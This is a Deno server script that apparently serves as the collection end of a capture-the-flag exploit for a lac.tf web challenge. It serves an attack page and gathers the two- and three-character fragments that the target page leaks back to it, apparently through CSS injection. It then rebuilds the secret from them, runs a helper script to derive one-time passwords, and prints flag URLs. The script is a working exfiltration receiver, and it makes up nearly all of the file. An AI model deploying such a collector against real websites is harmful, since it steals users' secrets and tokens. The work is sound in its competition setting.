import {writeAll} from "https://deno.land/std@0.216.0/io/write_all.ts";

const text = await Deno.readTextFile('./heyy.html')

let set = new Set()
let first = true
let id

Deno.serve({port:8080}, req => {
  // console.log(req.url)
  const part = req.url.split('/').at(-1)
  if (part === 'load') {
    // dont respond. let it sit.
    return new Promise(()=>{})
  } else if (part){
    if (!set.has(part)) {
      set.add(part)
      writeAll(Deno.stdout, new TextEncoder().encode(part + ' '))
    }
    clearTimeout(id)
    id=setTimeout(async () => {
      console.log()
      const two = [...set].filter(a => a.length===2)
      const three = [...set].filter(a => a.length===3)
      console.log('pairs:', two.join(' '))
      console.log('trigraphs:', three.join(' '))
      if (two.length !== 79) {
        console.error(two.join(' '))
        console.error(`${two.length} pairs received, expected 79. :/`)
        // Deno.exit(1)
      }
      if (three.length !== 78) {
        console.error(three.join(' '))
        console.error(`${three.length} triplets received, expected 78. :/`)
        // Deno.exit(1)
      }
      // wow:for (const a of [...set]) {
      //   if (a.length === 2) {
      //     for (const b of set) {
      //       if (b.length === 3 && b.includes(a)) {
      //         set.delete(a)
      //         continue wow
      //       }
      //     }
      //   }
      // }
      // console.log([...set].join(' '))

      const lowers = {}
      for (const b of two) {
        lowers[b.toLowerCase()] ??= []
        lowers[b.toLowerCase()].push(b)
      }
      // console.log(lowers)
      let i =0
      const w = three.map(a => {
        const options = new Set()
        for (const lower of lowers[a.slice(0, 2)]??[]) {
for (const  upper of lowers[a.slice(1)]??[]){
  if (lower[1] === upper[0]) {
    options.add(lower + upper[1])
  }
}
        }
        // const lower = lowers[a.slice(0, 2)]
        let w = [...options]
        if (w.length>1) console.log('multiple options',a,w)
        if (w.length===0) console.log('no options',a,)
        return w
      })

      // function permute (m) {
      //   if(m.length === 0) {return []}
      //   if (m .length === 1) {
      //     return [m[0]]
      //   }
      //   const [x, ...a]=m
      //   return x.flatMap(y => permute(a).map(b => [y,...b]))
      // }

      function permute(arrays) {
        if (arrays.length === 0) return [[]];

        const firstArray = arrays[0];
        const restArrays = arrays.slice(1);

        const permutationsOfRest = permute(restArrays);

        const result = [];

        for (const element of firstArray) {
            for (const permutation of permutationsOfRest) {
                result.push([element, ...permutation]);
            }
        }

        return result;
    }

    // Example usage:
    // const arrays = [[1], [2, 3], [4]];
    // const permutations = permute(arrays);
    // console.log(permutations);

    console.log('permuting', w)

    const ans = []
for (const b of permute(w)) {
  console.log(`python3 bubby.py ${b.join('-')}`)
  const command = new Deno.Command('python3', {
    args: [
      'bubby.py',
      b.join('-')
    ],
  });

  const {stdout,stderr} = await command.output()
  const out = new TextDecoder().decode(stdout)
  console.log(out)
  console.error(new TextDecoder().decode(stderr))
  const otp = out.trim()
  let s = otp[0]
  for (let i = 0; i < otp.length; i+=2) {
    s += otp[i+1]
  }
  console.log(s)
  if(otp){

    console.log('https://quickstyle.chall.lac.tf/flag?user=1&otp='+s + ' ✨')
    ans.push(s)
  }
}


console.log('results', ans)
if (three.length !== 78) {
  console.error(three.join(' '))
  console.error(`${three.length} triplets received, expected 78. :/`)
  // Deno.exit(1)
}
      // Deno.exit()
      set = new Set()
    }, 2000)
  // if (set.size > 70 && first) {
  //   first = false
  // }
  return new Response('', {headers:{'Access-Control-Allow-Origin':'*'}})
} else
  {
    console.log('page accessed!', req.headers.get('user-agent'))
    return new Response(text, {headers:{'Access-Control-Allow-Origin':'*'}}) // Deno.readTextFile('./heyy.html') .then(text => new Response(text, {headers:{'Access-Control-Allow-Origin':'*'}}))
  }
})
